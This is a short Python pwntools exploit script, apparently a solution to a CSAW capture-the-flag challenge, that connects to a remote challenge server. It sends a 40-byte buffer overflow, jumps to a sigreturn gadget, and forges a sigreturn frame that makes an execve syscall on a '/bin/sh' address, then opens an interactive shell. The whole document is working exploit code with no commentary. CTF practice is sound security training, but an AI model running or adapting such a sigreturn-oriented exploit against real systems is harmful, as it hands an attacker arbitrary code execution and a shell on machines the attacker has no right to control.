#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

p = remote('pwn.chal.csaw.io', 1002)

bin_sh = 0x4001ca
sigreturn = 0x400180
syscall = 0x400185

payload = 'A'*40
payload += p64(sigreturn)

frame = SigreturnFrame(kernel='amd64')
frame.rax = 59
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload += str(frame)

p.send(payload)

p.interactive()
